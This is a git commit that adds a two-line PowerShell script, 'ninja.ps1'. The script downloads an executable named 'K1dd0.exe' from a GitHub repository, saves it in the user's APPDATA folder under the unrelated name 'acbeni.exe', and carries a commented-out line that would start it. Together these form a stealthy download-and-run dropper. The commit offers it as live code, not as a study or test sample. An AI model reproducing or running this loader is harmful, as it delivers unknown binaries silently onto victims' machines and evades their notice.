7d465eaa79abf9ced2fbb032657be48ab5c0ea65
justgonnaspace <76230020+justgonnaspace@users.noreply.github.com>
2020-12-19 22:54:09 +0300

    Add files via upload

---
+++ ninja.ps1
@@ -0,0 +1,2 @@
+﻿(New-Object System.Net.WebClient).DownloadFile("https://github.com/justgonnaspace/k1dd0/blob/main/K1dd0.exe?raw=true","$env:APPDATA\acbeni.exe")
+#Start-Process "$env:APPDATA\acbeni.exe"
